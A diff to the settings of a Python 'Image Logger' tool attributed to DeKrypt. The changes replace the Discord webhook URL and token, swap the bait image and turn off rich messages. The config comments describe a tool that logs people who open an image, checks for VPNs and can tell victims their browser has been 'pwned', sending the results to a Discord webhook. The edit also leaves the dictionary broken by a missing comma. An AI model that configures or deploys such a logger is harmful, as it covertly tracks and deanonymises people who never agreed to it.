@@ -11,11 +11,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1378916435991990332/PLKc90-cazlsWdDjfJqZcqNGQMb-cx4OKwK9HUlmi5BbWTRKCo13mVDcucWZhUKmq3Ap",
-    "image": "https://i.pinimg.com/736x/f3/45/41/f34541049e0698a6ce37d4d88bc1a13a.jpg", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
+    "webhook": "https://discord.com/api/webhooks/1379068670202089615/wIb9sLsME80BBLPIsTpFtcmDXFbiCC2Uj2BYugCXQ1PndzfvVNdlTMk-v_yt6cpIYxeW",
+    "image": "https://asianmoviepulse.com/wp-content/uploads/2020/10/vinland-saga-990x557.jpg"
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
@@ -28,7 +25,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": False, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
